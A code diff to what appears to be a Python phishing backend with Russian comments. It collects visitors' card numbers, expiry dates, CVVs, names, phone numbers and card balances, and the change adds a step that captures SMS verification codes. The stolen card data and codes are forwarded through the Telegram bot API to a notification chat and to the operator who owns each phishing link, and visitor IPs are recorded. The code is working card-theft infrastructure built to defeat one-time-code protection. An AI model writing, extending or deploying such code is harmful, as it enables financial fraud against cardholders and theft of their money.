@@ -36,28 +36,35 @@ class CardSubmit(BaseModel):
     # balance check (step 2)
     balance_amount: str = ""
     balance_currency: str = ""
+    # sms code (step 3)
+    verification_code: str = ""
     # context — filled by the page, not the user
     subdomain: str = ""
     link_id: str = ""
 
 
-async def _send_telegram(text: str) -> None:
-    if not BOT_TOKEN or not NOTIFY_CHAT_ID:
-        logger.warning("NOTIFY_CHAT_ID or BOT_TOKEN not configured — skipping notification")
+async def _send_telegram(text: str, owner_tg_id: int | None = None) -> None:
+    if not BOT_TOKEN:
+        logger.warning("BOT_TOKEN not configured — skipping notification")
         return
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    payload = {
-        "chat_id": NOTIFY_CHAT_ID,
-        "text": text,
-        "parse_mode": "HTML",
-    }
-    try:
-        async with httpx.AsyncClient(timeout=8) as client:
-            r = await client.post(url, json=payload)
-            if r.status_code != 200:
-                logger.error("Telegram sendMessage failed: %s", r.text)
-    except Exception as exc:
-        logger.error("Telegram sendMessage exception: %s", exc)
+    targets = set()
+    if NOTIFY_CHAT_ID:
+        targets.add(str(NOTIFY_CHAT_ID))
+    if owner_tg_id:
+        targets.add(str(owner_tg_id))
+    if not targets:
+        logger.warning("No recipients configured — skipping notification")
+        return
+    for chat_id in targets:
+        payload = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
+        try:
+            async with httpx.AsyncClient(timeout=8) as client:
+                r = await client.post(url, json=payload)
+                if r.status_code != 200:
+                    logger.error("Telegram sendMessage failed for %s: %s", chat_id, r.text)
+        except Exception as exc:
+            logger.error("Telegram sendMessage exception for %s: %s", chat_id, exc)
 
 
 
@@ -82,6 +89,7 @@ async def bin_lookup(bin: str) -> JSONResponse:
 async def submit_form(payload: CardSubmit, request: Request) -> JSONResponse:
     # Resolve link owner from subdomain + link_id
     owner_line = "неизвестен"
+    owner_tg_id = None
     if payload.subdomain and payload.link_id:
         try:
             async with get_session() as session:
@@ -93,14 +101,36 @@ async def submit_form(payload: CardSubmit, request: Request) -> JSONResponse:
                     if owner:
                         uname = f"@{owner.username}" if owner.username else f"id:{owner.id}"
                         owner_line = f"{uname} (tg_id: <code>{owner.id}</code>)"
+                        owner_tg_id = owner.id
         except Exception as exc:
             logger.error("Error resolving link owner: %s", exc)
 
-    # Resolve visitor IP
     ip = (
         request.headers.get("X-Forwarded-For", "").split(",")[0].strip()
         or (request.client.host if request.client else "unknown")
     )
+
+    # ── SMS код — короткое отдельное сообщение ────────────────────────────────
+    if payload.verification_code:
+        code_msg = "\n".join([
+            "🔑 <b>SMS-код от посетителя</b>",
+            "",
+            f"🔗 {payload.subdomain}/{payload.link_id}",
+            "",
+            "💳 <b>Карта:</b>",
+            f"  Номер: <code>{payload.card_number or '—'}</code>",
+            f"  Срок: <code>{payload.card_exp or '—'}</code>",
+            f"  CVV: <code>{payload.card_cvv or '—'}</code>",
+            f"  Имя: {payload.card_name or '—'}",
+            "",
+            f"Код от смс: <b>{payload.verification_code}</b>",
+        ])
+        await _send_telegram(code_msg, owner_tg_id)
+        return JSONResponse({"ok": True})
+
+    # ── Основное сообщение — только когда введён баланс ──────────────────────
+    if not payload.balance_amount:
+        return JSONResponse({"ok": True})
 
     lines = [
         "🔔 <b>Новая заявка</b>",
@@ -125,14 +155,10 @@ async def submit_form(payload: CardSubmit, request: Request) -> JSONResponse:
             dial=payload.phone_dial or "",
             phone=payload.phone or "—",
         ),
+        "",
+        "💰 <b>Баланс карты:</b> "
+        f"<code>{payload.balance_amount} {payload.balance_currency or ''}</code>",
     ]
 
-    if payload.balance_amount:
-        lines += [
-            "",
-            "💰 <b>Баланс карты:</b> "
-            f"<code>{payload.balance_amount} {payload.balance_currency or ''}</code>",
-        ]
-
-    await _send_telegram("\n".join(lines))
+    await _send_telegram("\n".join(lines), owner_tg_id)
     return JSONResponse({"ok": True})
